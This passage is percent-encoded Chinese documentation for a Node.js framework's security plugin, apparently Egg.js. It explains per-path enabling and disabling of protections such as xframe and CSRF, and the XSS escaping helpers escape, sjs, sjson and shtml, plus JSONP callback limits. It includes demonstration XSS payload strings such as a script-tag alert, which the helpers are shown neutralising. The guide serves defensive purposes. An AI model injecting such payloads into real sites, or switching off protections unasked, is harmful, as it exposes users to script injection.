0%82%0A%0A%E6%A1%86%E6%9E%B6%E7%9A%84%E5%AE%89%E5%85%A8%E6%8F%92%E4%BB%B6%E6%98%AF%E9%BB%98%E8%AE%A4%E5%BC%80%E5%90%AF%E7%9A%84%EF%BC%8C%E5%A6%82%E6%9E%9C%E6%88%91%E4%BB%AC%E6%83%B3%E5%85%B3%E9%97%AD%E5%85%B6%E4%B8%AD%E4%B8%80%E4%BA%9B%E5%AE%89%E5%85%A8%E9%98%B2%E8%8C%83%EF%BC%8C%E7%9B%B4%E6%8E%A5%E8%AE%BE%E7%BD%AE%E8%AF%A5%E9%A1%B9%E7%9A%84%20%60enable%60%20%E5%B1%9E%E6%80%A7%E4%B8%BA%20false%20%E5%8D%B3%E5%8F%AF%E3%80%82%E4%BE%8B%E5%A6%82%E5%85%B3%E9%97%AD%20xframe%20%E9%98%B2%E8%8C%83%EF%BC%9A%0A%0A%60%60%60js%0Aexports.security%20%3D%20%7B%0A%20%20xframe%3A%20%7B%0A%20%20%20%20enable%3A%20false%2C%0A%20%20%7D%2C%0A%7D%3B%0A%60%60%60%0A%0A%23%23%23%20match%20%E5%92%8C%20ignore%0A%0Amatch%20%E5%92%8C%20ignore%20%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95%E5%92%8C%E6%A0%BC%E5%BC%8F%E4%B8%8E%5B%E4%B8%AD%E9%97%B4%E4%BB%B6%E9%80%9A%E7%94%A8%E9%85%8D%E7%BD%AE%5D(..%2Fbasics%2Fmiddleware.md%23match%E5%92%8Cignore)%E4%B8%80%E8%87%B4%E3%80%82%0A%0A%E5%A6%82%E6%9E%9C%E5%8F%AA%E6%83%B3%E5%BC%80%E5%90%AF%E9%92%88%E5%AF%B9%E6%9F%90%E4%B8%80%E8%B7%AF%E5%BE%84%EF%BC%8C%E5%88%99%E9%85%8D%E7%BD%AE%20match%20%E9%80%89%E9%A1%B9%EF%BC%8C%E4%BE%8B%E5%A6%82%E5%8F%AA%E9%92%88%E5%AF%B9%20%60%2Fexample%60%20%E5%BC%80%E5%90%AF%20CSP%EF%BC%9A%0A%0A%60%60%60js%0Aexports.security%20%3D%20%7B%0A%20%20csp%3A%20%7B%0A%20%20%20%20match%3A%20'%2Fexample'%2C%0A%20%20%20%20policy%3A%20%7B%0A%20%20%20%20%20%20%2F%2F...%0A%20%20%20%20%7D%2C%0A%20%20%7D%2C%0A%7D%3B%0A%60%60%60%0A%0A%E5%A6%82%E6%9E%9C%E9%9C%80%E8%A6%81%E9%92%88%E5%AF%B9%E6%9F%90%E4%B8%80%E8%B7%AF%E5%BE%84%E5%BF%BD%E7%95%A5%E6%9F%90%E5%AE%89%E5%85%A8%E9%80%89%E9%A1%B9%EF%BC%8C%E5%88%99%E9%85%8D%E7%BD%AE%20ignore%20%E9%80%89%E9%A1%B9%EF%BC%8C%E4%BE%8B%E5%A6%82%E9%92%88%E5%AF%B9%20%60%2Fexample%60%20%E5%85%B3%E9%97%AD%20xframe%EF%BC%8C%E4%BB%A5%E4%BE%BF%E5%90%88%E4%BD%9C%E5%95%86%E6%88%B7%E8%83%BD%E5%A4%9F%E5%B5%8C%E5%85%A5%E6%88%91%E4%BB%AC%E7%9A%84%E9%A1%B5%E9%9D%A2%EF%BC%9A%0A%0A%60%60%60js%0Aexports.security%20%3D%20%7B%0A%20%20csp%3A%20%7B%0A%20%20%20%20ignore%3A%20'%2Fexample'%2C%0A%20%20%20%20xframe%3A%20%7B%0A%20%20%20%20%20%20%2F%2F...%0A%20%20%20%20%7D%2C%0A%20%20%7D%2C%0A%7D%3B%0A%60%60%60%0A%0A%E5%A6%82%E6%9E%9C%E8%A6%81%E9%92%88%E5%AF%B9%E5%86%85%E9%83%A8%20ip%20%E5%85%B3%E9%97%AD%E9%83%A8%E5%88%86%E5%AE%89%E5%85%A8%E9%98%B2%E8%8C%83%EF%BC%9A%0A%0A%60%60%60js%0Aexports.security%20%3D%20%7B%0A%20%20csrf%3A%20%7B%0A%20%20%20%20%2F%2F%20%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E9%9C%80%E8%A6%81%20ignore%20%E7%9A%84%E6%96%B9%E6%B3%95%EF%BC%8C%E8%AF%B7%E6%B1%82%E4%B8%8A%E4%B8%8B%E6%96%87%20context%20%E4%BD%9C%E4%B8%BA%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%8F%82%E6%95%B0%0A%20%20%20%20ignore%3A%20ctx%20%3D%3E%20isInnerIp(ctx.ip)%2C%0A%20%20%7D%2C%0A%7D%0A%60%60%60%0A%0A%E4%B8%8B%E9%9D%A2%E6%88%91%E4%BB%AC%E4%BC%9A%E9%92%88%E5%AF%B9%E5%85%B7%E4%BD%93%E7%9A%84%E5%9C%BA%E6%99%AF%EF%BC%8C%E6%9D%A5%E8%AE%B2%E8%A7%A3%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E6%A1%86%E6%9E%B6%E6%8F%90%E4%BE%9B%E7%9A%84%E5%AE%89%E5%85%A8%E6%96%B9%E6%A1%88%E8%BF%9B%E8%A1%8C%20Web%20%E5%AE%89%E5%85%A8%E9%98%B2%E8%8C%83%E3%80%82%0A%0A%23%23%20%E5%AE%89%E5%85%A8%E5%A8%81%E8%83%81%60%20XSS%20%60%E7%9A%84%E9%98%B2%E8%8C%83%0A%0A%5BXSS%5D(https%3A%2F%2Fwww.owasp.org%2Findex.php%2FCross-site_Scripting_(XSS))%EF%BC%88cross-site%20scripting%E8%B7%A8%E5%9F%9F%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%EF%BC%89%E6%94%BB%E5%87%BB%E6%98%AF%E6%9C%80%E5%B8%B8%E8%A7%81%E7%9A%84%20Web%20%E6%94%BB%E5%87%BB%EF%BC%8C%E5%85%B6%E9%87%8D%E7%82%B9%E6%98%AF%E3%80%8E%E8%B7%A8%E5%9F%9F%E3%80%8F%E5%92%8C%E3%80%8E%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%89%A7%E8%A1%8C%E3%80%8F%E3%80%82%0A%0AXSS%20%E6%94%BB%E5%87%BB%E4%B8%80%E8%88%AC%E5%88%86%E4%B8%BA%E4%B8%A4%E7%B1%BB%EF%BC%9A%0A%0A-%20Reflected%20XSS%EF%BC%88%E5%8F%8D%E5%B0%84%E5%9E%8B%E7%9A%84%20XSS%20%E6%94%BB%E5%87%BB%EF%BC%89%0A-%20Stored%20XSS%EF%BC%88%E5%AD%98%E5%82%A8%E5%9E%8B%E7%9A%84%20XSS%20%E6%94%BB%E5%87%BB%EF%BC%89%0A%0A%23%23%23%20Reflected%20XSS%0A%0A%E5%8F%8D%E5%B0%84%E5%9E%8B%E7%9A%84%20XSS%20%E6%94%BB%E5%87%BB%EF%BC%8C%E4%B8%BB%E8%A6%81%E6%98%AF%E7%94%B1%E4%BA%8E%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%8E%A5%E6%94%B6%E5%88%B0%E5%AE%A2%E6%88%B7%E7%AB%AF%E7%9A%84%E4%B8%8D%E5%AE%89%E5%85%A8%E8%BE%93%E5%85%A5%EF%BC%8C%E5%9C%A8%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%A7%A6%E5%8F%91%E6%89%A7%E8%A1%8C%E4%BB%8E%E8%80%8C%E5%8F%91%E8%B5%B7%20Web%20%E6%94%BB%E5%87%BB%E3%80%82%E6%AF%94%E5%A6%82%EF%BC%9A%0A%0A%E5%9C%A8%E6%9F%90%E8%B4%AD%E7%89%A9%E7%BD%91%E7%AB%99%E6%90%9C%E7%B4%A2%E7%89%A9%E5%93%81%EF%BC%8C%E6%90%9C%E7%B4%A2%E7%BB%93%E6%9E%9C%E4%BC%9A%E6%98%BE%E7%A4%BA%E6%90%9C%E7%B4%A2%E7%9A%84%E5%85%B3%E9%94%AE%E8%AF%8D%E3%80%82%E6%90%9C%E7%B4%A2%E5%85%B3%E9%94%AE%E8%AF%8D%E5%A1%AB%E5%85%A5%60%3Cscript%3Ealert('handsome%20boy')%3C%2Fscript%3E%60%2C%20%E7%82%B9%E5%87%BB%E6%90%9C%E7%B4%A2%E3%80%82%E9%A1%B5%E9%9D%A2%E6%B2%A1%E6%9C%89%E5%AF%B9%E5%85%B3%E9%94%AE%E8%AF%8D%E8%BF%9B%E8%A1%8C%E8%BF%87%E6%BB%A4%EF%BC%8C%E8%BF%99%E6%AE%B5%E4%BB%A3%E7%A0%81%E5%B0%B1%E4%BC%9A%E7%9B%B4%E6%8E%A5%E5%9C%A8%E9%A1%B5%E9%9D%A2%E4%B8%8A%E6%89%A7%E8%A1%8C%EF%BC%8C%E5%BC%B9%E5%87%BA%20alert%E3%80%82%0A%0A%23%23%23%23%20%E9%98%B2%E8%8C%83%E6%96%B9%E5%BC%8F%0A%0A%E6%A1%86%E6%9E%B6%E6%8F%90%E4%BE%9B%E4%BA%86%20%60helper.escape()%60%20%E6%96%B9%E6%B3%95%E5%AF%B9%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%9B%E8%A1%8C%20XSS%20%E8%BF%87%E6%BB%A4%E3%80%82%0A%0A%60%60%60js%0Aconst%20str%20%3D%20'%3E%3Cscript%3Ealert(%22abc%22)%20%3C%2Fscript%3E%3C'%3B%0Aconsole.log(ctx.helper.escape(str))%3B%0A%2F%2F%20%3D%3E%20%26gt%3B%26lt%3Bscript%26gt%3Balert(%26quot%3Babc%26quot%3B)%20%26lt%3B%2Fscript%26gt%3B%26lt%3B%0A%60%60%60%0A%0A%E5%BD%93%E7%BD%91%E7%AB%99%E9%9C%80%E8%A6%81%E7%9B%B4%E6%8E%A5%E8%BE%93%E5%87%BA%E7%94%A8%E6%88%B7%E8%BE%93%E5%85%A5%E7%9A%84%E7%BB%93%E6%9E%9C%E6%97%B6%EF%BC%8C%E8%AF%B7%E5%8A%A1%E5%BF%85%E4%BD%BF%E7%94%A8%20%60helper.escape()%60%20%E5%8C%85%E8%A3%B9%E8%B5%B7%E6%9D%A5%EF%BC%8C%E5%A6%82%E5%9C%A8%20%5Begg-view-nunjucks%5D%20%E9%87%8C%E9%9D%A2%E5%B0%B1%E8%A6%86%E7%9B%96%E6%8E%89%E4%BA%86%E5%86%85%E7%BD%AE%E7%9A%84%20%60escape%60%E3%80%82%0A%0A%E5%8F%A6%E5%A4%96%E4%B8%80%E7%A7%8D%E6%83%85%E5%86%B5%EF%BC%8C%E7%BD%91%E7%AB%99%E8%BE%93%E5%87%BA%E7%9A%84%E5%86%85%E5%AE%B9%E4%BC%9A%E6%8F%90%E4%BE%9B%E7%BB%99%20JavaScript%20%E6%9D%A5%E4%BD%BF%E7%94%A8%E3%80%82%E8%BF%99%E4%B8%AA%E6%97%B6%E5%80%99%E9%9C%80%E8%A6%81%E4%BD%BF%E7%94%A8%20%60helper.sjs()%60%20%E6%9D%A5%E8%BF%9B%E8%A1%8C%E8%BF%87%E6%BB%A4%E3%80%82%0A%0A%60helper.sjs()%60%20%E7%94%A8%E4%BA%8E%E5%9C%A8%20JavaScript%EF%BC%88%E5%8C%85%E6%8B%AC%20onload%20%E7%AD%89%20event%EF%BC%89%E4%B8%AD%E8%BE%93%E5%87%BA%E5%8F%98%E9%87%8F%EF%BC%8C%E4%BC%9A%E5%AF%B9%E5%8F%98%E9%87%8F%E4%B8%AD%E5%AD%97%E7%AC%A6%E8%BF%9B%E8%A1%8C%20JavaScript%20ENCODE%EF%BC%8C%0A%E5%B0%86%E6%89%80%E6%9C%89%E9%9D%9E%E7%99%BD%E5%90%8D%E5%8D%95%E5%AD%97%E7%AC%A6%E8%BD%AC%E4%B9%89%E4%B8%BA%20%60%5Cx%60%20%E5%BD%A2%E5%BC%8F%EF%BC%8C%E9%98%B2%E6%AD%A2%20XSS%20%E6%94%BB%E5%87%BB%EF%BC%8C%E4%B9%9F%E7%A1%AE%E4%BF%9D%E5%9C%A8%20js%20%E4%B8%AD%E8%BE%93%E5%87%BA%E7%9A%84%E6%AD%A3%E7%A1%AE%E6%80%A7%E3%80%82%E4%BD%BF%E7%94%A8%E5%AE%9E%E4%BE%8B%EF%BC%9A%0A%0A%60%60%60js%0Aconst%20foo%20%3D%20'%22hello%22'%3B%0A%0A%2F%2F%20%E6%9C%AA%E4%BD%BF%E7%94%A8%20sjs%0Aconsole.log(%60var%20foo%20%3D%20%22%24%7Bfoo%7D%22%3B%60)%3B%0A%2F%2F%20%3D%3E%20var%20foo%20%3D%20%22%22hello%22%22%3B%0A%0A%2F%2F%20%E4%BD%BF%E7%94%A8%20sjs%0Aconsole.log(%60var%20foo%20%3D%20%22%24%7Bthis.helper.sjs(foo)%7D%22%3B%60)%3B%0A%2F%2F%20%3D%3E%20var%20foo%20%3D%20%22%5C%5Cx22hello%5C%5Cx22%22%3B%0A%60%60%60%0A%0A%E8%BF%98%E6%9C%89%E4%B8%80%E7%A7%8D%E6%83%85%E5%86%B5%EF%BC%8C%E6%9C%89%E6%97%B6%E5%80%99%E6%88%91%E4%BB%AC%E9%9C%80%E8%A6%81%E5%9C%A8%20JavaScript%20%E4%B8%AD%E8%BE%93%E5%87%BA%20json%20%EF%BC%8C%E8%8B%A5%E6%9C%AA%E5%81%9A%E8%BD%AC%E4%B9%89%EF%BC%8C%E6%98%93%E8%A2%AB%E5%88%A9%E7%94%A8%E4%B8%BA%20XSS%20%E6%BC%8F%E6%B4%9E%E3%80%82%E6%A1%86%E6%9E%B6%E6%8F%90%E4%BE%9B%E4%BA%86%20%60helper.sjson()%60%20%E5%AE%8F%E5%81%9A%20json%20encode%EF%BC%8C%E4%BC%9A%E9%81%8D%E5%8E%86%20json%20%E4%B8%AD%E7%9A%84%20key%20%EF%BC%8C%E5%B0%86%20value%20%E7%9A%84%E5%80%BC%E4%B8%AD%EF%BC%8C%E6%89%80%E6%9C%89%E9%9D%9E%E7%99%BD%E5%90%8D%E5%8D%95%E5%AD%97%E7%AC%A6%E8%BD%AC%E4%B9%89%E4%B8%BA%20%60%5Cx%60%20%E5%BD%A2%E5%BC%8F%EF%BC%8C%E9%98%B2%E6%AD%A2%20XSS%20%E6%94%BB%E5%87%BB%E3%80%82%E5%90%8C%E6%97%B6%E4%BF%9D%E6%8C%81%20json%20%E7%BB%93%E6%9E%84%E4%B8%8D%E5%8F%98%E3%80%82%0A%E8%8B%A5%E5%AD%98%E5%9C%A8%E6%A8%A1%E6%9D%BF%E4%B8%AD%E8%BE%93%E5%87%BA%E4%B8%80%E4%B8%AA%20JSON%20%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%BB%99%20JavaScript%20%E4%BD%BF%E7%94%A8%E7%9A%84%E5%9C%BA%E6%99%AF%EF%BC%8C%E8%AF%B7%E4%BD%BF%E7%94%A8%20%60helper.sjson(%E5%8F%98%E9%87%8F%E5%90%8D)%60%20%E8%BF%9B%E8%A1%8C%E8%BD%AC%E4%B9%89%E3%80%82%0A%0A**%E5%A4%84%E7%90%86%E8%BF%87%E7%A8%8B%E8%BE%83%E5%A4%8D%E6%9D%82%EF%BC%8C%E6%80%A7%E8%83%BD%E6%8D%9F%E8%80%97%E8%BE%83%E5%A4%A7%EF%BC%8C%E8%AF%B7%E4%BB%85%E5%9C%A8%E5%BF%85%E8%A6%81%E6%97%B6%E4%BD%BF%E7%94%A8%E3%80%82**%0A%0A%E5%AE%9E%E4%BE%8B%3A%0A%0A%60%60%60html%0A%20%20%3Cscript%3E%0A%20%20%20%20window.locals%20%3D%20%7B%7B%20helper.sjson(locals)%20%7D%7D%3B%0A%20%20%3C%2Fscript%3E%0A%60%60%60%0A%0A%23%23%23%20Stored%20XSS%0A%0A%E5%9F%BA%E4%BA%8E%E5%AD%98%E5%82%A8%E7%9A%84%20XSS%20%E6%94%BB%E5%87%BB%EF%BC%8C%E6%98%AF%E9%80%9A%E8%BF%87%E6%8F%90%E4%BA%A4%E5%B8%A6%E6%9C%89%E6%81%B6%E6%84%8F%E8%84%9A%E6%9C%AC%E7%9A%84%E5%86%85%E5%AE%B9%E5%AD%98%E5%82%A8%E5%9C%A8%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%EF%BC%8C%E5%BD%93%E5%85%B6%E4%BB%96%E4%BA%BA%E7%9C%8B%E5%88%B0%E8%BF%99%E4%BA%9B%E5%86%85%E5%AE%B9%E6%97%B6%E5%8F%91%E8%B5%B7%20Web%20%E6%94%BB%E5%87%BB%E3%80%82%E4%B8%80%E8%88%AC%E6%8F%90%E4%BA%A4%E7%9A%84%E5%86%85%E5%AE%B9%E9%83%BD%E6%98%AF%E9%80%9A%E8%BF%87%E4%B8%80%E4%BA%9B%E5%AF%8C%E6%96%87%E6%9C%AC%E7%BC%96%E8%BE%91%E5%99%A8%E7%BC%96%E8%BE%91%E7%9A%84%EF%BC%8C%E5%BE%88%E5%AE%B9%E6%98%93%E6%8F%92%E5%85%A5%E5%8D%B1%E9%99%A9%E4%BB%A3%E7%A0%81%E3%80%82%0A%0A%23%23%23%23%20%E9%98%B2%E8%8C%83%E6%96%B9%E5%BC%8F%0A%0A%E6%A1%86%E6%9E%B6%E6%8F%90%E4%BE%9B%E4%BA%86%20%60helper.shtml()%60%20%E6%96%B9%E6%B3%95%E5%AF%B9%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%9B%E8%A1%8C%20XSS%20%E8%BF%87%E6%BB%A4%E3%80%82%0A%0A%E6%B3%A8%E6%84%8F%EF%BC%8C%E5%B0%86%E5%AF%8C%E6%96%87%E6%9C%AC%EF%BC%88%E5%8C%85%E5%90%AB%20HTML%20%E4%BB%A3%E7%A0%81%E7%9A%84%E6%96%87%E6%9C%AC%EF%BC%89%E5%BD%93%E6%88%90%E5%8F%98%E9%87%8F%E7%9B%B4%E6%8E%A5%E5%9C%A8%E6%A8%A1%E7%89%88%E9%87%8C%E9%9D%A2%E8%BE%93%E5%87%BA%E6%97%B6%EF%BC%8C%E9%9C%80%E8%A6%81%E7%94%A8%E5%88%B0%20shtml%20%E6%9D%A5%E5%A4%84%E7%90%86%E3%80%82%0A%E4%BD%BF%E7%94%A8%20shtml%20%E5%8F%AF%E4%BB%A5%E8%BE%93%E5%87%BA%20HTML%20%E7%9A%84%20tag%EF%BC%8C%E5%90%8C%E6%97%B6%E6%89%A7%E8%A1%8C%20XSS%20%E7%9A%84%E8%BF%87%E6%BB%A4%E5%8A%A8%E4%BD%9C%EF%BC%8C%E8%BF%87%E6%BB%A4%E6%8E%89%E9%9D%9E%E6%B3%95%E7%9A%84%E8%84%9A%E6%9C%AC%E3%80%82%0A%0A**%E7%94%B1%E4%BA%8E%E6%98%AF%E4%B8%80%E4%B8%AA%E9%9D%9E%E5%B8%B8%E5%A4%8D%E6%9D%82%E7%9A%84%E5%AE%89%E5%85%A8%E5%A4%84%E7%90%86%E8%BF%87%E7%A8%8B%EF%BC%8C%E5%AF%B9%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%A4%84%E7%90%86%E6%80%A7%E8%83%BD%E4%B8%80%E5%AE%9A%E5%BD%B1%E5%93%8D%EF%BC%8C%E5%A6%82%E6%9E%9C%E4%B8%8D%E6%98%AF%E8%BE%93%E5%87%BA%20HTML%EF%BC%8C%E8%AF%B7%E5%8B%BF%E4%BD%BF%E7%94%A8%E3%80%82**%0A%0A%E7%AE%80%E5%8D%95%E7%A4%BA%E4%BE%8B%EF%BC%9A%0A%0A%60%60%60js%0A%2F%2F%20js%0Aconst%20value%20%3D%20%60%3Ca%20href%3D%22http%3A%2F%2Fwww.domain.com%22%3Egoogle%3C%2Fa%3E%3Cscript%3Eevilcode%E2%80%A6%3C%2Fscript%3E%60%3B%0A%0A%60%60%60%0A%0A%60%60%60html%0A%0A%2F%2F%20%E6%A8%A1%E6%9D%BF%0A%3Chtml%3E%0A%3Cbody%3E%0A%20%20%7B%7B%20helper.shtml(value)%20%7D%7D%0A%3C%2Fbody%3E%0A%3C%2Fhtml%3E%0A%2F%2F%20%3D%3E%20%3Ca%20href%3D%22http%3A%2F%2Fwww.domain.com%22%3Egoogle%3C%2Fa%3E%26lt%3Bscript%26gt%3Bevilcode%E2%80%A6%26lt%3B%2Fscript%26gt%3B%0A%0A%60%60%60%0A%0Ashtml%20%E5%9C%A8%20%5Bxss%5D(https%3A%2F%2Fgithub.com%2Fleizongmin%2Fjs-xss%2F)%20%E6%A8%A1%E5%9D%97%E5%9F%BA%E7%A1%80%E4%B8%8A%E5%A2%9E%E5%8A%A0%E4%BA%86%E9%92%88%E5%AF%B9%E5%9F%9F%E5%90%8D%E7%9A%84%E8%BF%87%E6%BB%A4%E3%80%82%0A%0A-%20%5B%E9%BB%98%E8%AE%A4%E8%A7%84%E5%88%99%5D(https%3A%2F%2Fgithub.com%2Fleizongmin%2Fjs-xss%2Fblob%2Fmaster%2Flib%2Fdefault.js)%0A-%20%E8%87%AA%E5%AE%9A%E4%B9%89%E8%BF%87%E6%BB%A4%E9%A1%B9%EF%BC%9A%20http%3A%2F%2Fjsxss.com%2Fzh%2Foptions.html%0A%0A%E4%BE%8B%E5%A6%82%E5%8F%AA%E6%94%AF%E6%8C%81%20a%20%E6%A0%87%E7%AD%BE%EF%BC%8C%E4%B8%94%E9%99%A4%E4%BA%86%20title%20%E5%85%B6%E4%BB%96%E5%B1%9E%E6%80%A7%E9%83%BD%E8%BF%87%E6%BB%A4%E6%8E%89%EF%BC%9A%20%60whiteList%3A%20%7Ba%3A%20%5B'title'%5D%7D%60%0A%0Aoptions%3A%0A%0A-%20%60config.helper.shtml.domainWhiteList%3A%20%5B%5D%60%20%E5%8F%AF%E6%8B%93%E5%B1%95%20href%20%E5%92%8C%20src%20%E4%B8%AD%E5%85%81%E8%AE%B8%E7%9A%84%E5%9F%9F%E5%90%8D%E7%99%BD%E5%90%8D%E5%8D%95%E3%80%82%0A%0A%E6%B3%A8%E6%84%8F%EF%BC%8Cshtml%20%E4%BD%BF%E7%94%A8%E4%BA%86%E4%B8%A5%E6%A0%BC%E7%9A%84%E7%99%BD%E5%90%8D%E5%8D%95%E6%9C%BA%E5%88%B6%EF%BC%8C%E9%99%A4%E4%BA%86%E8%BF%87%E6%BB%A4%E6%8E%89%20XSS%20%E9%A3%8E%E9%99%A9%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A4%96%EF%BC%8C%0A%E5%9C%A8%5B%E9%BB%98%E8%AE%A4%E8%A7%84%E5%88%99%5D(https%3A%2F%2Fgithub.com%2Fleizongmin%2Fjs-xss%2Fblob%2Fmaster%2Flib%2Fdefault.js)%E5%A4%96%E7%9A%84%20tag%20%E5%92%8C%20attr%20%E9%83%BD%E4%BC%9A%E8%A2%AB%E8%BF%87%E6%BB%A4%E6%8E%89%E3%80%82%0A%0A%E4%BE%8B%E5%A6%82%20HTML%20%E6%A0%87%E7%AD%BE%E5%B0%B1%E4%B8%8D%E5%9C%A8%E7%99%BD%E5%90%8D%E5%8D%95%E4%B8%AD%EF%BC%8C%0A%0A%60%60%60js%0Aconst%20html%20%3D%20'%3Chtml%3E%3C%2Fhtml%3E'%3B%0A%0A%2F%2F%20html%0A%7B%7B%20helper.shtml(html)%20%7D%7D%0A%0A%2F%2F%20%E8%BE%93%E5%87%BA%E7%A9%BA%0A%60%60%60%0A%0A%E5%B8%B8%E8%A7%81%E7%9A%84%20%60data-xx%60%20%E5%B1%9E%E6%80%A7%E7%94%B1%E4%BA%8E%E4%B8%8D%E5%9C%A8%E7%99%BD%E5%90%8D%E5%8D%95%E4%B8%AD%EF%BC%8C%E6%89%80%E4%BB%A5%E9%83%BD%E4%BC%9A%E8%A2%AB%E8%BF%87%E6%BB%A4%E3%80%82%0A%0A%E6%89%80%E4%BB%A5%EF%BC%8C%E4%B8%80%E5%AE%9A%E8%A6%81%E6%B3%A8%E6%84%8F%20shtml%20%E7%9A%84%E9%80%82%E7%94%A8%E5%9C%BA%E6%99%AF%EF%BC%8C%E4%B8%80%E8%88%AC%E6%98%AF%E9%92%88%E5%AF%B9%E6%9D%A5%E8%87%AA%E7%94%A8%E6%88%B7%E7%9A%84%E5%AF%8C%E6%96%87%E6%9C%AC%E8%BE%93%E5%85%A5%EF%BC%8C%E5%88%87%E5%BF%8C%E6%BB%A5%E7%94%A8%EF%BC%8C%E5%8A%9F%E8%83%BD%E6%97%A2%E5%8F%97%E5%88%B0%E9%99%90%E5%88%B6%EF%BC%8C%E5%8F%88%E4%BC%9A%E5%BD%B1%E5%93%8D%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%80%A7%E8%83%BD%E3%80%82%0A%E6%AD%A4%E7%B1%BB%E5%9C%BA%E6%99%AF%E4%B8%80%E8%88%AC%E6%98%AF%E8%AE%BA%E5%9D%9B%E3%80%81%E8%AF%84%E8%AE%BA%E7%B3%BB%E7%BB%9F%E7%AD%89%EF%BC%8C%E5%8D%B3%E4%BE%BF%E6%98%AF%E8%AE%BA%E5%9D%9B%E7%AD%89%E5%A6%82%E6%9E%9C%E4%B8%8D%E6%94%AF%E6%8C%81%20HTML%20%E5%86%85%E5%AE%B9%E8%BE%93%E5%85%A5%EF%BC%8C%E4%B9%9F%E4%B8%8D%E8%A6%81%E4%BD%BF%E7%94%A8%E6%AD%A4%20Helper%EF%BC%8C%E7%9B%B4%E6%8E%A5%E4%BD%BF%E7%94%A8%20%60escape%60%20%E5%8D%B3%E5%8F%AF%E3%80%82%0A%0A%23%23%23%20JSONP%20XSS%0A%0AJSONP%20%E7%9A%84%20callback%20%E5%8F%82%E6%95%B0%E9%9D%9E%E5%B8%B8%E5%8D%B1%E9%99%A9%EF%BC%8C%E4%BB%96%E6%9C%89%E4%B8%A4%E7%A7%8D%E9%A3%8E%E9%99%A9%E5%8F%AF%E8%83%BD%E5%AF%BC%E8%87%B4%20XSS%0A%0A1%E3%80%81callback%20%E5%8F%82%E6%95%B0%E6%84%8F%E5%A4%96%E6%88%AA%E6%96%ADjs%E4%BB%A3%E7%A0%81%EF%BC%8C%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6%E5%8D%95%E5%BC%95%E5%8F%B7%E5%8F%8C%E5%BC%95%E5%8F%B7%EF%BC%8C%E6%8D%A2%E8%A1%8C%E7%AC%A6%E5%9D%87%E5%AD%98%E5%9C%A8%E9%A3%8E%E9%99%A9%E3%80%82%0A%0A2%E3%80%81callback%20%E5%8F%82%E6%95%B0%E6%81%B6%E6%84%8F%E6%B7%BB%E5%8A%A0%E6%A0%87%E7%AD%BE%EF%BC%88%E5%A6%82%20%60%3Cscript%3E%60%20%EF%BC%89%EF%BC%8C%E9%80%A0%E6%88%90%20XSS%20%E6%BC%8F%E6%B4%9E%E3%80%82%0A%0A%E5%8F%82%E8%80%83%20%5BJSONP%20%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%5D(http%3A%2F%2Fblog.knownsec.com%2F2015%2F03%2Fjsonp_security_technic%2F)%0A%0A%E6%A1%86%E6%9E%B6%E5%86%85%E9%83%A8%E4%BD%BF%E7%94%A8%20%5Bjsonp-body%5D(https%3A%2F%2Fgithub.com%2Fnode-modules%2Fjsonp-body)%20%E6%9D%A5%E5%AF%B9%20JSONP%20%E8%AF%B7%E6%B1%82%E8%BF%9B%E8%A1%8C%E5%AE%89%E5%85%A8%E9%98%B2%E8%8C%83%E3%80%82%0A%0A%E9%98%B2%E5%BE%A1%E5%86%85%E5%AE%B9%EF%BC%9A%0A%0A*%20callback%20%E5%87%BD%E6%95%B0%E5%90%8D%E8%AF%8D%E6%9C%80%E9%95%BF%2050%20%E4%B8%AA%E5%AD%97%E7%AC%A6%E9%99%90%E5%88%B6%0A*%20callback%20%E5%87%BD%E6%95%B0%E5%90%8D%E5%8F%AA%E5%85%81%E8%AE%B8%20%60%5B%60%2C%20%60%5D%60%2C%20%60a-zA-Z0123456789_%60%2C%20%60%24%60%2C%20%60.%60%EF%BC%8C%E9%98%B2%E6%AD%A2%E4%B8%80%E8%88%AC%E7%9A%84%20XSS%EF%BC%8Cutf-7%20XSS%E7%AD%89%E6%94%BB%E5%87%BB%E3%80%82%0A%0A%E5%8F%AF%E5%AE%9A%E4%B9%89%E9%85%8D%E7%BD%AE%EF%BC%9A%0A%0A*%20callback%20%E9%BB%98%E8%AE%A4%20%60_callback%60%EF%BC%8C%E5%8F%AF%E4%BB%A5%E9%87%8D%E5%91%BD%E5%90%8D%E3%80%82%0A*%20limit%20-%20%E5%87%BD%E6%95%B0%E5%90%8D%20length%20%E9%99%90%E5%88%B6%EF%BC%8C%E9%BB%98%E8%AE%A4%2050%E3%80%82%0A%0A%23%23%23%20%E5%85%B6%E4%BB%96%20XSS%20%E7%9A%84%E9%98%B2%E8%8C%83%E6%96%B9%E5%BC%8F%0A%0A%E6%B5%8F%E8%A7%88%E5%99%A8%E8%87%AA%E8%BA%AB%E5%85%B7%E6%9C%89%E4%B8%80%E5%AE%9A%E9%92%88%E5%AF%B9%E5%90%84%E7%A7%8D%E6%94%BB%E5%87%BB%E7%9A%84%E9%98%B2%E8%8C%83%E8%83%BD%E5%8A%9B%EF%BC%8C%E4%BB%96%E4%BB%AC%E4%B8%80%E8%88%AC%E6%98%AF%E9%80%9A%E8%BF%87%E5%BC%80%E5%90%AF%20Web%20%E5%AE%89%E5%85%A8%E5%A4%B4%E7%94%9F%E6%95%88%E7%9A%84%E3%80%82%E6%A1%86%E6%9E%B6%E5%86%85%E7%BD%AE%E4%BA%86%E4%B8%80%E4%BA%9B%E5%B8%B8%E8%A7%81%E7%9A%84%20Web%20%E5%AE%89%E5%85%A8%E5%A4%B4%E7%9A%84%E6%94%AF%E6%8C%81%E3%80%82%0A%0A%23%23%23%23%20CSP%0A%0AW3C%20%E7%9A%84%20Content%20Security%20Policy%EF%BC%8C%E7%AE%80%E7%A7%B0%20CSP%EF%BC%8C%E4%B8%BB%E8%A6%81%E6